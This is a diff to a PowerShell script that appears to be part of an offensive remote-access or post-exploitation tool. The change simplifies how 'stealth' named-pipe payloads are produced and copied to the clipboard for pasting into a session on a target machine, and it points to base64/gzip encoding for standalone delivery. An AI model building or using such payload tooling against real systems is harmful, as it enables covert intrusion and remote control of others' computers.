@@ -2970,17 +2970,12 @@ while (`$true) {
 		}
 		elseif($chosenFormat -eq 'stealth'){
 			$built = New-PayloadScript -ComputerName $ComputerName -PipeName $PipeName
-			$wrapped = Get-PayloadLauncher -Script $built.InlinePS -Launcher $global:PayloadConfig.Launcher
 			$global:LastInlinePS = $built.InlinePS
-			Write-Output " [1] Inline PS -- paste into existing session"
+			Write-Output " Inline PS -- paste into existing PS session on target:"
 			Write-Output " $($built.InlinePS)"
 			Write-Output ""
-			Write-Output " [2] Full command -- launcher: $($global:PayloadConfig.Launcher)"
-			Write-Output " $wrapped"
-			Write-Output ""
-			Write-Host " Copy to clipboard [1] Inline PS  [2] Full command: " -NoNewline
-			$_sc = (Read-Host).Trim()
-			$_clipPayload = if ($_sc -eq '2') { $wrapped } else { $built.InlinePS }
+			Write-Host " [*] Stealth payload copied to clipboard (inline PS only -- too large for command-line launchers; use b64/gzip for standalone delivery)" -ForegroundColor Cyan
+			$_clipPayload = $built.InlinePS
 		}
   		elseif($chosenFormat -eq 'exe'){
 			$ClientScriptEdit = $ClientScript += ";exit"
@@ -3186,17 +3181,12 @@ while (`$true) {
 	elseif($chosenFormat -eq 'stealth'){
 		$stealthSID = if($global:Detach){'S-1-1-0'} else {$SID}
 		$built = New-PayloadScript -IsServer -PipeName $PN -SID $stealthSID
-		$wrapped = Get-PayloadLauncher -Script $built.InlinePS -Launcher $global:PayloadConfig.Launcher
 		$global:LastInlinePS = $built.InlinePS
-		Write-Output " [1] Inline PS -- paste into existing session on target"
+		Write-Output " Inline PS -- paste into existing PS session on target:"
 		Write-Output " $($built.InlinePS)"
 		Write-Output ""
-		Write-Output " [2] Full command -- launcher: $($global:PayloadConfig.Launcher)"
-		Write-Output " $wrapped"
-		Write-Output ""
-		Write-Host " Copy to clipboard [1] Inline PS  [2] Full command: " -NoNewline
-		$_sc = (Read-Host).Trim()
-		$_clipPayload = if ($_sc -eq '2') { $wrapped } else { $built.InlinePS }
+		Write-Host " [*] Stealth payload copied to clipboard (inline PS only -- too large for command-line launchers; use b64/gzip for standalone delivery)" -ForegroundColor Cyan
+		$_clipPayload = $built.InlinePS
 	}
 	if ($_clipPayload) {
 		Set-Clipboard -Value $_clipPayload
